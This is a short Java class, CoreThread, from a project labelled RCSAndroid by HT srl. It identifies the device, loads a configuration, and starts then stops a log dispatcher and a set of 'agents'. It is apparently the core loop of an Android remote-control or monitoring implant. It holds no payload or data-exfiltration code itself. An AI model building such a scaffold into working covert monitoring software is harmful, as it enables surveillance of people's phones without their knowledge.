/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

public class CoreThread extends Activity implements Runnable {
	private boolean bStopCore = false;
	private Resources resources;
	private Thread coreThread;
	private ContentResolver contentResolver;
	private AgentManager agentManager;

	public boolean Start(Resources r, ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();

		resources = r;
		contentResolver = cr;
		
		Check.asserts(resources != null, "Null Resources");
		
		coreThread.start();
		return true;
	}

	public boolean Stop() {
		bStopCore = true;
		Log.d("Que", "RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	public void run() {
		Log.d("Que", "RCS Thread Started");

		try {
			// Initialize the configuration object
			Configuration conf = new Configuration(this.resources);
			
			// Identify the device uniquely 
			Device device = new Device(contentResolver);
			device.init();
			
			// Load the configuration
			conf.LoadConfiguration();
			
			// Start log dispatcher
			LogDispatcher logDispatcher = LogDispatcher.self();
			logDispatcher.start();
			
			// Start agents
			agentManager.startAgents();
			
			Utils.sleep(3000);
			
			// Stop agents
			agentManager.stopAgents();
			
			// Ci stiamo chiudendo
			logDispatcher.halt();
			
			while (logDispatcher.isAlive())
				Utils.sleep(250);
			
			Log.d("Que", "LogDispatcher Killed");
		} catch (RCSException rcse) {
			rcse.printStackTrace();
			Log.d("Que", "RCSException() detected");
		} catch (Exception e) {
			e.printStackTrace();
			Log.d("Que", "Exception() detected");			
		}
		
		return;
		
		/*while (bStopCore == false) {
			// Task Init

			// Check Action
		}*/
	}

	public boolean Init() {
		return false;
	}
	
	public boolean Run() {
		return false;
	}
}
